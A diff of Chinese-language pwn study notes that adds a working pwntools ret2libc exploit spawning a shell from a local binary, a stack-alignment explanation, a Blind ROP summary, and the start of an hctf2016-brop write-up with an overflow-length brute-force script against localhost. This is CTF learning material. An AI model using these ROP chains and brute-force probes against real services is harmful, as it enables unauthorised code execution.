@@ -225,12 +225,396 @@ Dump of assembler code for function __libc_csu_init:
 End of assembler dump.
 ```
 
-动态调试
+#### payload
 
 ```python
-cyclic <- hexToDecimal(0x80-0x00) + 8 = 132 bytes
-
+Payload
+	>Low Address
+     +-------------+
+     | cyclic      | <--- hexToDecimal(0x80-0x00) + 8 = 136 bytes
+     | ret         | <--- 关键(64位下的 16-bytes 栈对齐)
+     | pop_rdi_ret |
+     | addr_bin_sh |
+     | addr_system |
+     +-------------+
+	>High Address
 ```
+
+* 破解前需要先关闭`ASLR`
+
+* gdb调试过程中到最后`segmental fault`，程序停留在了
+
+  ```python
+  0x7ffff7e13e3c <do_system+364>    movaps xmmword ptr [rsp + 0x50], xmm0
+  ```
+
+  经查看`rsp`的值为
+
+  ```python
+  rsp   0x7fffffffd838
+  ```
+
+  没有`16-bytes`对齐，因此`rsp+0x50`没有对齐，然而`movaps`需要`16-bytes`对齐，因此执行失败，需要查找ret指令的位置填充栈空间
+
+#### 报错`dbg`图
+
+<img src="D:\Github\pwn\pwn_study\images\ret2csu_segment_fault.png" alt="ret2csu_segment_fault" style="zoom:38%;" />
+
+#### exploit
+
+```python
+from pwn import *
+
+""" VA from __libc_csu_init """
+pop_rbx = 0x40121b
+pop_rdi_ret = 0x401223
+ret_addr = 0x40101a
+
+""" offset from database """
+offset___libc_start_main_ret = 0x24083
+offset_system = 0x0000000000052290
+offset_dup2 = 0x000000000010e8c0
+offset_read = 0x000000000010dfc0
+offset_write = 0x000000000010e060
+offset_str_bin_sh = 0x1b45bd
+offset___libc_start_main = 0x0000000000023f90
+offset_puts = 0x0000000000084420
+offset_exit = 0x0000000000046a40
+
+""" addr of functions in libc """
+addr_write = 0x7ffff7ed0060
+
+libcBase = addr_write - offset_write
+
+addr_system = libcBase + offset_system  # shell function addr
+
+addr_str_bin_sh = libcBase + offset_str_bin_sh  # parameter
+
+addr_exit = libcBase + offset_exit  # exit function
+
+io = process('./level')
+
+# io = gdb.debug("./level","break main")
+
+# payload = flat(cyclic(132),pop_rdi_ret,addr_str_bin_sh,addr_system,pop_rdi_ret,0,)
+
+payload = b'a' * 136 + p64(ret_addr) +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)
+
+# payload_error = b'a' * 136 +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)
+
+io.sendline(payload)
+# io.sendline(payload)
+
+io.interactive()
+```
+
+
+
+#### 栈对齐
+
+> 栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。我们都知道栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。
+
+* 即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。
+* 因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：
+* 任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。
+* 大多数函数的栈帧的边界都必须是16直接的倍数。
+
+如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。
+
+```assembly
+movups
+mov //移动指令
+u //不必16字节对齐
+ps //（packed single-precision floating-point）表示打包的单精度浮点数
+
+movaps
+mov //移动指令
+u //必需16字节对齐
+ps //（packed single-precision floating-point）表示打包的单精度浮点数
+```
+
+
+
+
+
+## ret2reg
+
+> ### 原理
+>
+> 1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间
+> 2. 然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址
+> 3. reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)
+
+
+
+## BROP
+
+> * `Blind ROP` : BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 **Hacking Blind**
+> * BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流
+
+### 攻击条件 
+
+1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
+2. **服务器端的进程在崩溃之后会重新启动**，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。
+
+
+
+### 基本思路
+
+在 BROP 中，基本的遵循的思路如下
+
+- 判断栈溢出长度
+
+  - 暴力枚举
+
+- Stack Reading
+
+  - 获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。
+
+  - 目前经典的栈布局
+
+    ```C
+    buffer|canary|saved fame pointer|saved returned address
+    ```
+
+  * 在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。
+
+    ```python
+    >>> 原理 <<<
+    调节payload的长度,每次暴力破解一个字节的内容(即payload尾部),如果该byte破解,则payload再加一字节的内容,作为`canary`中的下一部分(byte)
+    ------------------------------
+    Every Byte includes 256 = 2^8
+    32-bit : 4 * 2^8 = 2^10 = 1024
+    64-bit : 8 * 2^8 = 2^11 = 2048
+    ------------------------------
+    ```
+
+    
+
+    ![stack_reading](D:\Github\pwn\pwn_study\images\stack_reading.png)
+
+    
+
+- Blind ROP
+
+  - 最朴素的执行 write 函数的方法就是构造系统调用。
+
+    ```assembly
+    pop rdi; ret # socket
+    pop rsi; ret # buffer
+    pop rdx; ret # length
+    pop rax; ret # write syscall number
+    syscall
+    ```
+
+    但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为**找 write**的方式来获取。
+
+  - 找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。
+
+    - rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可
+
+      - 但是，在程序中很少出现
+
+        ```python
+        pop rdx; ret
+        ```
+
+    - 控制 rdx 的数值
+
+      > 这里需要说明执行 `strcmp` 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。
+
+  - 那么接下来的问题，我们就可以分为两项
+
+    - 寻找 gadgets
+      - 控制参数`rdi`和`rsi`
+    - 寻找 PLT 表
+      - write 入口
+      - strcmp 入口
+
+- Build the exploit
+
+  - 利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。
+
+
+
+#### BROP gadgets
+
+> 从不同偏移处开始反汇编，可以得到对不同`register`的控制！！！
+>
+> 最关键的是`pop rdi`和`rsi`，设计64位的头两个参数
+
+![brop_gadget](D:\Github\pwn\pwn_study\images\brop_gadget.png)
+
+```assembly
+pwndbg> disassemble 0x4007ba,0x4007c5
+Dump of assembler code from 0x4007ba to 0x4007c5:
+   0x00000000004007ba <__libc_csu_init+90>:	pop    rbx
+   0x00000000004007bb <__libc_csu_init+91>:	pop    rbp
+   0x00000000004007bc <__libc_csu_init+92>:	pop    r12
+   0x00000000004007be <__libc_csu_init+94>:	pop    r13
+   0x00000000004007c0 <__libc_csu_init+96>:	pop    r14
+   0x00000000004007c2 <__libc_csu_init+98>:	pop    r15
+   0x00000000004007c4 <__libc_csu_init+100>:	ret    
+End of assembler dump.
+
+pwndbg> disassemble 0x4007ba+0x7,0x4007c5
+Dump of assembler code from 0x4007c1 to 0x4007c5:
+   0x00000000004007c1 <__libc_csu_init+97>:	pop    rsi
+   0x00000000004007c2 <__libc_csu_init+98>:	pop    r15
+   0x00000000004007c4 <__libc_csu_init+100>:	ret    
+End of assembler dump.
+
+pwndbg> disassemble 0x4007ba+0x9,0x4007c5
+Dump of assembler code from 0x4007c3 to 0x4007c5:
+   0x00000000004007c3 <__libc_csu_init+99>:	pop    rdi
+   0x00000000004007c4 <__libc_csu_init+100>:	ret    
+End of assembler dump.
+```
+
+
+
+#### stop gadgets
+
+> 所谓`stop gadget`一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。之所以要寻找 `stop gadgets`，是因为当我们猜到某个 gadgtes 后，如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了
+
+##### 定义栈上的三种地址Probe
+
+- Probe
+  - 探针，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。
+- Stop
+  - 不会使得程序崩溃的 stop gadget 的地址。
+- Trap
+  - 可以导致程序崩溃的地址
+
+#### stack 探测
+
+* 我们可以通过在栈上摆放不同顺序的 **Stop** 与 **Trap** 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子
+  * `probe,stop,traps(traps,traps,...)`
+    - 我们通过程序崩溃与否 (如果程序在 probe 处直接崩溃怎么判断) 可以找到不会对栈进行 pop 操作的 gadget，如
+      - ret
+      - xor eax,eax; ret
+  * `probe,trap,stop,traps`
+    - 我们可以通过这样的布局找到**只是弹出一个栈变量**的 gadget。如
+      - pop rax; ret
+      - pop rdi; ret
+  * `probe, trap, trap, trap, trap, trap, trap, stop, traps`
+    - 我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的... ...这里一般来说会遇到两处比较有意思的地方
+      - `plt` 处不会崩，，
+      - `_start` 处不会崩，相当于程序重新执行。
+      - 需要注意的是向 BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。
+* 需要注意的是 `probe` 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.
+
+#### 寻找 plt
+
+> 如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 `16` 字节。而且，在每一个表项的 `6` 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。
+
+![brop_plt](D:\Github\pwn\pwn_study\images\brop_plt.png)
+
+> 对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了**一系列的长度为 16 的没有使得程序崩溃的代码段**，那么我们有一定的理由相信我们遇到了 `plt` 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。
+
+
+
+#### 控制 rdx
+
+> * 并不是所有的程序都会调用 strcmp 函数
+>
+> * 这里给出程序中使用 strcmp 函数的情况。
+>
+> * 定义以下两种地址
+>
+>   - readable，可读的地址。
+>   - bad, 非法地址，不可访问，比如说 0x0。
+>
+> * 如果控制传递的参数为这两种地址的组合，会出现以下四种情况
+>
+>   - strcmp(bad,bad)
+>   - strcmp(bad,readable)
+>   - strcmp(readable,bad)
+>   - strcmp(readable,readable)
+>
+>   只有最后一种格式，程序才会正常执行。
+>
+> * 没有 PIE 保护的时候，64 位程序的 ELF 文件的 `0x400000` 处有 7 个非零字节。
+
+
+
+#### 寻找输出函数
+
+> 寻找输出函数既可以寻找 write，也可以寻找 puts。一般现先找 puts 函数。不过这里为了介绍方便，先介绍如何寻找 write。
+
+##### 寻找write@plt
+
+当我们可以控制 write 函数的三个参数的时候，我们就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值
+
+- 使用 rop chain，同时使得每个 rop 对应的文件描述符不一样
+- 同时打开多个连接，并且我们使用相对较高的数值来试一试。
+
+需要注意的是
+
+- linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。
+- posix 标准每次申请的文件描述符数值总是当前最小可用数值。
+
+当然，我们也可以选择寻找 puts 函数。
+
+##### 寻找puts@plt
+
+寻找 `puts` 函数 (这里我们寻找的是`plt`)，我们自然需要控制 `rdi` 参数，在上面，我们已经找到了 `brop gadget`。那么，我们根据 `brop gadget` 偏移 9 可以得到相应的 `gadgets`（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。一般来说，其 payload 如下
+
+```python
+payload = b'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
+```
+
+
+
+## writeup_brop
+
+> 采取题目是`hctf2016-brop`
+
+### 确定栈溢出长度
+
+```python
+from pwn import *
+
+def getbuffer_len():
+  i=1
+  while 1:
+    try:
+      io = remote('127.0.0.1',9999)
+      io.recvuntil(b'WelCome my friend,Do you know password?\n')
+      io.send(i*b'a')
+      output = io.recv()
+      io.close()
+      if not output.startswith(b'No password'):
+        return i-1
+      else:
+        i+=1
+    except EOFError:
+        io.close()
+        return i-1
+
+
+if __name__ == "__main__":
+    buffer_len = getbuffer_len()
+    print("The length of buffer overflow is ",buffer_len)
+```
+
+最终得到`buffer`长度
+
+<img src="D:\Github\pwn\pwn_study\images\brop_buffer_len.png" alt="brop_buffer_len" style="zoom:50%;" />
+
+首先确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。
+
+
+
+### 
+
+
+
+
+
+
+
+
 
 
 
@@ -276,7 +660,11 @@ gcc -z now -o test test.c				// 全部开启，即
 
 
 
-## pwntools技巧
+
+
+## Tips
+
+### pwntools技巧
 
 > 直接使用
 >
@@ -294,6 +682,51 @@ payload=b'aaaaaa'
 sh=gdb.debug("pwn","break main")
 sh.sendline(payload)
 ```
+
+
+
+### linux技巧
+
+* 报错`Address already in use`
+
+  ```python
+  netstat -apn | grep port <--端口值
+  --- 查到pid
+  or: ps -ef | grep port
+  --- 查看pid以及user
+  kill -9 pid
+  --- 杀死进程即可
+  ```
+
+* 
+
+
+
+
+
+## ubuntu 搭建本地服务器测试
+
+#### 使用socat本地搭建测试
+
+```python
+终端 1: socat tcp-l:6666,fork exec:./文件名,reuseaddr	
+终端 2: nc 0.0.0.0 6666   测试
+```
+
+1. **服务器端的进程在崩溃之后会重新启动**，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序**最初启动**的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。
+2. 可以开两个`terminal`，然后一个作为**服务器**在后台运行，另一个可以脚本攻击等。
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
